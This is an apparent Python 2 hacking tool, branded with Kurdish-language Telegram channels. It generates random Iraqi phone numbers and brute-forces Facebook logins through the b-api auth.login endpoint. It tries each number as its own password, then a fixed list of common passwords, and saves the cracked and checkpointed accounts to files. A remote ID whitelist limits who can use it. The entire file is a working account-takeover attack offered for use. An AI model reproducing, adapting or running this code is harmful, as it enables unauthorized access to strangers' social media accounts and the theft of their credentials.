import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, time
os.system('rm -rf .txt')
for n in range(40000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
os.system('clear')
os.system('rm -rf list.txt')
os.system('id -u > list.txt')
uidd = open('list.txt', 'r')
for j in uidd:
    sp = j.split()

manglist = requests.get('https://raw.githubusercontent.com/KURDISHIT/BCC/main/BCC.txt')
idd = manglist.text

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)


def t():
    os.system('clear')


def cb():
    os.system('clear')


back = 0
successful = []
cpb = []
oks = []
id = []
os.system('clear')


logo = """\033[91m
\033[93mTELEGRAM CHANEL = KURDISH IT
YOUTUBE CHANEL = MIRAN BOSS
TELEGRAM SHXSE = Dragon_Crack4  
TELEGRAM ADMIN = king_it2
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="""

def menu():
    os.system('clear')
    os.system('figlet B C C')
    print '\x1b[1;92m[1]\x1b[1;92m  Iraq'
    print '\x1b[1;95m[2]\x1b[1;92m  Arbil'
    print '\x1b[1;94m[3]\x1b[1;92m  slemani'
    print '\n\x1b[1;91m[0]  Exit            '
    print '\x1b[1;92m--------------------------------------------------\n'
    action()


def action():
    global cpb
    global oks
    peak = raw_input('\n\x1b[1;92mChoose an Option : \x1b[1;91m')
    if peak == '':
        print '[!] Fill In Correctly'
        action()
    elif peak == '1':
        os.system('clear')
        os.system('figlet B C C')
        print logo
        print '\x1b[1;91m IRAQ ' + '\n'
        print '\x1b[1;92m770-771-772-773-774-750-751-752-753-754' + '\n'
        try:
            c = raw_input('\x1b[1;92mChoose Code : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '2':
        os.system('clear')
        os.system('figlet B C C')
        print logo
        print '\x1b[1;91m ARBIL ' + '\n'
        print '\x1b[1;92m770-771-772-773-774-750-751-752-753-754-780-781-782-783-784' + '\n'
        try:
            c = raw_input('\x1b[1;92mChoose Code : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
     
    elif peak == '3':
        os.system('clear')
        os.system('figlet B C C')
        print logo
        print '\x1b[1;92m  Slemani '+ '\n'
        print '\x1b[1;92m770-771-772-773-774-750-751-752-753-754-780-781-782-783-784' + '\n'
        try:
            c = raw_input('\x1b[1;92mChoose Code : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
           
    elif peak == '0':
        menu()
    else:
        print '[!] Fill In Correctly'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] Hamu zhmarakan: ' + xxx)
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] Hack krdn dastepekrd')
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] Tkayachawarebka...')
    time.sleep(0.5)
    psb('[!] Bowastandne Toll  CTRL + z')
    time.sleep(0.5)
    print '\x1b[1;97m--------------------------------------------------'

    def main(arg):
        user = arg
        try:
            os.mkdir('IT')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print'\x1b[1;96m______________________________________'
                print'\x1b[1;95m>_ \x1b[1;92m[RAQAM] >>>'+k +c +user
                print'\x1b[1;95m>_ \x1b[1;92m[PASS] >>>'+pass1
                print'\x1b[1;95m>_ \x1b[1;93mCOD >>'+k
                print'\x1b[1;95m>_ \x1b[1;94mSocial >>FACEBOOK'
                print'\x1b[1;95m>_ \x1b[1;91mWLAT >> IRAQ'
                print'\x1b[1;95m>_ \x1b[1;92mNOTE >>HACK BO >>> pass1''\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print'\x1b[1;96m______________________________________'
                print'\x1b[1;95m>_ \x1b[1;91m[RAQAM] >>>'+k +c+ user
                print'\x1b[1;95m>_ \x1b[1;91m[PASS] >>>'+pass1
                print'\x1b[1;95m>_ \x1b[1;93mCOD >>'+k
                print'\x1b[1;95m>_ \x1b[1;94mSocial >>FACEBOOK'
                print'\x1b[1;95m>_ \x1b[1;91mWLAT >> IRAQ'
                print'\x1b[1;95m>_ \x1b[1;91mNOTE >>HACK NABO >>> pass1''\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = 'hama123'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print'\x1b[1;96m______________________________________'
                print'\x1b[1;95m>_ \x1b[1;92m[RAQAM] >>>'+k + c+user
                print'\x1b[1;95m>_ \x1b[1;92m[PASS] >>>'+pass2
                print'\x1b[1;95m>_ \x1b[1;93mCOD >>'+k
                print'\x1b[1;95m>_ \x1b[1;94mSocial >>FACEBOOK'
                print'\x1b[1;95m>_ \x1b[1;91mWLAT >> IRAQ'
                print'\x1b[1;95m>_ \x1b[1;92mNOTE >>HACK BO >>> pass2''\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + pass2 + '\n')
                okb.close()
                oks.append(c + user + pass2)
            elif 'www.facebook.com' in q['error_msg']:
                print'\x1b[1;96m______________________________________'
                print'\x1b[1;95m>_\x1b[1;91m[RAQAM] >>>'+k +c+user
                print'\x1b[1;95m>_\x1b[1;91m[PASS] >>>'+pass2
                print'\x1b[1;95m>_ \x1b[1;93mCOD >>'+k
                print'\x1b[1;95m>_\x1b[1;94mSocial >>FACEBOOK'
                print'\x1b[1;95m>_ \x1b[1;91mWLAT >> IRAQ'
                print'\x1b[1;95m>_\x1b[1;91mNOTE >>HACK NABO >>> pass2' '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + pass2 + '\n')
                cps.close()
                cpb.append(c + user + pass2)
            else:
                    pass3 = 'hama1234'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print'\x1b[1;96m______________________________________'
                        print'\x1b[1;95m>_ \x1b[1;92m[RAQAM] >>>'+k +c+user
                        print'\x1b[1;95m>_ \x1b[1;92m[PASS] >>>'+pass3
                        print'\x1b[1;95m>_ \x1b[1;93mCOD >>'+k
                        print'\x1b[1;95m>_ \x1b[1;94mSocial >>FACEBOOK'
                        print'\x1b[1;95m>_ \x1b[1;91mWLAT >> IRAQ'
                        print'\x1b[1;95m>_ \x1b[1;92mNOTE >>HACK BO >>> pass3'
                        okb = open('anggaxd/clone.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print'\x1b[1;96m______________________________________'
                        print'\x1b[1;95m>_\x1b[1;91m[RAQAM] >>>'+k +c+ user
                        print'\x1b[1;95m>_ \x1b[1;91m[PASS] >>>'+pass3
                        print'\x1b[1;95m>_ \x1b[1;93mCOD >>'+k
                        print'\x1b[1;95m>_ \x1b[1;94mSocial >>FACEBOOK'
                        print'\x1b[1;95m>_ \x1b[1;91mWLAT >> IRAQ'
                        print'\x1b[1;95m>_ \x1b[1;91mNOTE >>HACK NABO >>> pass3''\n'
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '>>>' + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = 'hama12345'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print'\x1b[1;96m______________________________________'
                            print'\x1b[1;95m>_ \x1b[1;92m[RAQAM] >>>'+k +c+user
                            print'\x1b[1;95m>_ \x1b[1;92m[PASS] >>>'+pass4
                            print'\x1b[1;95m>_ \x1b[1;93mCOD >>'+k
                            print'\x1b[1;95m>_ \x1b[1;94mSocial >>FACEBOOK'
                            print'\x1b[1;95m>_ \x1b[1;91mWLAT >> IRAQ'
                            print'\x1b[1;95m>_ \x1b[1;92mNOTE >>HACK BO >>> pass4'
                            okb = open('anggaxd/clone.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print'\x1b[1;96m______________________________________'
                            print'\x1b[1;95m>_\x1b[1;91m[RAQAM] >>>'+k +c+user
                            print'\x1b[1;95m>_ \x1b[1;91m[PASS] >>>'+pass4
                            print'\x1b[1;95m>_\x1b[1;93mCOD >>'+k
                            print'\x1b[1;95m>_\x1b[1;94mSocial >>FACEBOOK'
                            print'\x1b[1;95m>_\x1b[1;91mWLAT >> IRAQ'
                            print'\x1b[1;95m>_\x1b[1;91mNOTE >>HACK NABO >>> pass4''\n'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k + c + user + '>>>' + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 ='ahmad123'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print'\x1b[1;96m______________________________________'
                                print'\x1b[1;95m>_ \x1b[1;92m[RAQAM] >>>'+k + c+user
                                print'\x1b[1;95m>_ \x1b[1;92m[PASS] >>>'+pass5
                                print'\x1b[1;95m>_ \x1b[1;93mCOD >>'+k
                                print'\x1b[1;95m>_ \x1b[1;94mSocial >>FACEBOOK'
                                print'\x1b[1;95m>_ \x1b[1;91mWLAT >> IRAQ'
                                print'\x1b[1;95m>_ \x1b[1;92mNOTE >>HACK BO >>> pass5'
                                okb = open('anggaxd/clone.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print'\x1b[1;96m______________________________________'
                                print'\x1b[1;95m>_'' \x1b[1;91m[RAQAM] >>>'+k + c+user
                                print'\x1b[1;95m>_ \x1b[1;91m[PASS] >>>'+pass5
                                print'\x1b[1;95m>_\x1b[1;93mCOD >>'+k
                                print'\x1b[1;95m>_\x1b[1;94mSocial>>FACEBOOK'
                                print'\x1b[1;95m>_\x1b[1;91mWLAT >> IRAQ'
                                print'\x1b[1;95m>_\x1b[1;91mNOTE >>HACK NABO >>> pass5''\n'
                                cps = open('save/checkpoint.txt', 'a')
                                cps.write(k + c + user + '>>>' + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
                            else:
                                pass6 = 'ahmad1234'
                                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print'\x1b[1;96m______________________________________'
                                    print'\x1b[1;95m>_ \x1b[1;92m[RAQAM] >>>'+k + c+user
                                    print'\x1b[1;95m>_ \x1b[1;92m[PASS] >>>'+pass6
                                    print'\x1b[1;95m>_ \x1b[1;93mCOD >>'+k
                                    print'\x1b[1;95m>_ \x1b[1;94mSocial >>FACEBOOK'
                                    print'\x1b[1;95m>_ \x1b[1;91mWLAT >> IRAQ'
                                    print'\x1b[1;95m>_ \x1b[1;92mNOTE >>HACK BO >>> pass6'
                                    okb = open('anggaxd/clone.txt', 'a')
                                    okb.write(k + c + user + pass6 + '\n')
                                    okb.close()
                                    oks.append(c + user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                   print'\x1b[1;96m______________________________________'
                                   print'\x1b[1;95m>_\x1b[1;91m[RAQAM] >>>'+k + c+user
                                   print'\x1b[1;95m>_ \x1b[1;91m[PASS] >>>'+pass6
                                   print'\x1b[1;95m>_ \x1b[1;93mCOD >>'+k
                                   print'\x1b[1;95m>_ \x1b[1;94mSocial >>\x1b[94mFACEBOOK'
                                   print'\x1b[1;95m>_ \x1b[1;91mWLAT >> IRAQ'
                                   print'\x1b[1;95m>_ \x1b[1;91mNOTE >>HACK NABO >>> pass6''\n'
                                   cps = open('save/checkpoint.txt', 'a')
                                   cps.write(k + c + user + '>>>' + pass6 + '\n')
                                   cps.close()
                                   cpb.append(c + user + pass6)
                                else:
                                    pass7 = 'ahmad12345'
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print'\x1b[1;96m______________________________________'
                                        print'\x1b[1;95m>_ \x1b[1;92m[RAQAM] >>>'+k + c+user
                                        print'\x1b[1;95m>_ \x1b[1;92m[PASS] >>>'+pass7
                                        print'\x1b[1;95m>_ \x1b[1;93mCOD >>'+k
                                        print'\x1b[1;95m>_ \x1b[1;94mSocial >>FACEBOOK'
                                        print'\x1b[1;95m>_ \x1b[1;91mWLAT >> IRAQ'
                                        print'\x1b[1;95m>_ \x1b[1;92mNOTE >>HACK BO >>> pass7'
                                        okb = open('anggaxd/clone.txt', 'a')
                                        okb.write(k + c + user + pass7 + '\n')
                                        okb.close()
                                        oks.append(c + user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print'\x1b[1;96m______________________________________'
                                        print'\x1b[1;95m>_'' \x1b[1;91m[RAQAM] >>>'+k + c+user
                                        print'\x1b[1;95m>_ ''\x1b[1;91m[PASS] >>>'+pass7
                                        print'\x1b[1;95m>_ "\x1b[1;93mCOD >>'+k
                                        print'\x1b[1;95m>_ "\x1b[1;94mSocial >>FACEBOOK'
                                        print'\x1b[1;95m>_ "\x1b[1;91mWLAT >> IRAQ'
                                        print'\x1b[1;95m>_ "\x1b[1;91mNOTE >>HACK NABO >>> pass7''\n'
                                        cps = open('save/checkpoint.txt', 'a')
                                        cps.write(k + c + user + '>>>' + pass7 + '\n')
                                        cps.close()
                                        cpb.append(c + user + pass7)
                                    else:
                                        pass8 = 'aland12345'
                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print'\x1b[1;96m______________________________________'
                                            print'\x1b[1;95m>_ \x1b[1;92m[RAQAM] >>>'+k + c+user
                                            print'\x1b[1;95m>_ \x1b[1;92m[PASS] >>>'+pass8
                                            print'\x1b[1;95m>_ \x1b[1;93mCOD >>'+k
                                            print'\x1b[1;95m>_ \x1b[1;94mSocial >>FACEBOOK'
                                            print'\x1b[1;95m>_ \x1b[1;91mWLAT >> IRAQ'
                                            print'\x1b[1;95m>_ \x1b[1;92mNOTE >>HACK BO >>> Pass8'
                                            okb = open('anggaxd/clone.txt', 'a')
                                            okb.write(k + c + user + pass8 + '\n')
                                            okb.close()
                                            oks.append(c + user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                           print'\x1b[1;96m______________________________________'
                                           print'\x1b[1;95m>_'' \x1b[1;91m[RAQAM] >>>'+k + c+user
                                           print'\x1b[1;95m>_ ''\x1b[1;91m[PASS] >>>'+pass8
                                           print'\x1b[1;95m>_ "\x1b[1;93mCOD >>'+k
                                           print'\x1b[1;95m>_ "\x1b[1;93mWLAT>> IRAQ'
                                           print'\x1b[1;95m>_ "\x1b[1;94mSocial >> FACEBOOK'
                                           print'\x1b[1;95m>_ "\x1b[1;91mNOTE >> HACK NABO >>> pass8''\n'
                                           cps = open('save/checkpoint.txt', 'a')
                                           cps.write(k + c + user + '>>>' + pass8 + '\n')
                                           cps.close()
                                           cpb.append(c + user + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 42 * '\x1b[1;93m='
    print '[\xe2\x9c\x93]\x1b[1;93m HACK KRDN KOTAYHAT ....'
    print '[\xe2\x9c\x93]\x1b[1;92m Total successfull/\x1b[1;96mcheckpoint : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] Cloned Accounts Has Been Saved : anggaxd/clone.txt'
    raw_input('\n\x1b[1;93m[\x1b[1;93mBack\x1b[1;93m]')
    menu()

for s in idd.split():
    print s
    if s == sp[0]:
       if __name__ == '__main__':
          menu()
else:
    os.system('clear')
    os.system('figlet ID ACTIVE')
    print '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
    bani = '  \n  Bo Active Krdni Tool Akat\n\n           Massg Bka La Telegram @Dragon_Crack4\n'
    print bani
    print '       ID To Amaya ===> ' + sp[0]
    print '\x1b[90;1m\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m\n\n\n'
    time.sleep(2)
    os.system('xdg-open https://t.me/Dragon_Crack4')
    os.sys.exit()
